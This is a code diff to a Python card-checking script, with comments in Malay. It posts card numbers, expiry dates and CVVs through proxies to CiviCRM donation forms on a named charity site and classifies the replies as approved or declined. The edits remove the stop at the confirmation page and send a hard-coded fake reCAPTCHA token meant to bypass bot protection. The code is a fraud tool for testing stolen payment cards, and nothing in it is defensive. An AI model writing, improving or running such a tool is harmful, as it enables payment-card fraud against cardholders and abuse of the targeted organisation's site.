@@ -218,6 +218,7 @@ def get_form_action_and_payload(session, url, proxy_url):
 def parse_response(html, url):
     soup = BeautifulSoup(html, 'html.parser')
     
+    # 1. Cari div error/status
     status_divs = soup.find_all('div', class_=re.compile(r'status|alert|error|messages|crm-error', re.I))
     for status_div in status_divs:
         error_text = status_div.get_text(separator=' ', strip=True)
@@ -228,6 +229,7 @@ def parse_response(html, url):
             if error_text:
                 return {'approved': False, 'has_msg': True, 'message': error_text, 'clean_response': error_text}
                 
+    # 2. Cari span class msg-text
     msg_text_span = soup.find('span', class_='msg-text')
     if msg_text_span:
         error_text = msg_text_span.get_text(strip=True)
@@ -237,6 +239,7 @@ def parse_response(html, url):
         if error_text and len(error_text) > 3:
             return {'approved': False, 'has_msg': True, 'message': error_text, 'clean_response': error_text}
 
+    # 3. Cari perkataan declined secara meluas
     all_text = soup.get_text(' ', strip=True)
     if re.search(r'(submission failed|failed to submit|transaction declined|error on participant|card declined)', all_text, re.I):
         match = re.search(r'(submission failed|failed to submit|transaction declined|error on participant|card declined)[^.]*', all_text, re.I)
@@ -246,8 +249,9 @@ def parse_response(html, url):
     if '_qf_ThankYou_display=true' in url or '_qf_ThankYou_display=1' in url:
         return {'approved': True, 'has_msg': False, 'message': 'Payment complete', 'clean_response': 'Payment complete'}
     
-    if '_qf_Confirm_display=true' in url or '_qf_Confirm_display=1' in url:
-        return {'approved': False, 'has_msg': False, 'message': 'Confirmation page', 'clean_response': '', 'is_confirmation': True}
+    # BUIANG BLOCK CONFIRMATION PAGE SUPAYA DIA TAK STOP DI SINI LAGI
+    # if '_qf_Confirm_display=true' in url or '_qf_Confirm_display=1' in url:
+    #     return {'approved': False, 'has_msg': False, 'message': 'Confirmation page', 'clean_response': '', 'is_confirmation': True}
     
     return {'approved': False, 'has_msg': False, 'message': 'Card Declined / Blocked by Site (Silent Response)', 'clean_response': 'Silent Block'}
 
@@ -288,7 +292,7 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, amoun
 
     final_payload = {}
     
-    # LETAK FAKE TOKEN UNTUK KEDUA-DUA INITIAL & CONFIRMATION PAGE
+    # TOKEN FAKE UNTUK KEDUA-DUA PAGE
     final_payload["g-recaptcha-response"] = "03AGdBq25 FakeTokenCivicrmBypass1234567890"
 
     if is_confirm:
@@ -384,7 +388,6 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
             
             logging.info(f"URL Selepas Submit Pertama: {response.url}")
             
-            # AKTIFKAN CONFIRMATION PAGE MELALUI URL
             confirm_btn = soup_resp.find('input', {'name': '_qf_Confirm_next'}) or soup_resp.find('button', {'name': '_qf_Confirm_next'})
             is_confirmation = '_qf_Confirm_display=true' in response.url or '_qf_Confirm_display=1' in response.url or 'qfKey=' in response.url
             
@@ -397,7 +400,7 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
                 if confirm_action:
                     confirm_post_url = urljoin("https://www.saharaaa.org/civicrm/contribute/transact/", confirm_action)
 
-                # FORCE URL CONFIRMATION SUPAYA SEMPURNA DENGAN _qf_Confirm_display=true
+                # FORCE URL CONFIRMATION SUPAYA SEMPURNA
                 if '?' in confirm_post_url:
                     if '_qf_Confirm_display=true' not in confirm_post_url:
                         confirm_post_url += '&_qf_Confirm_display=true'
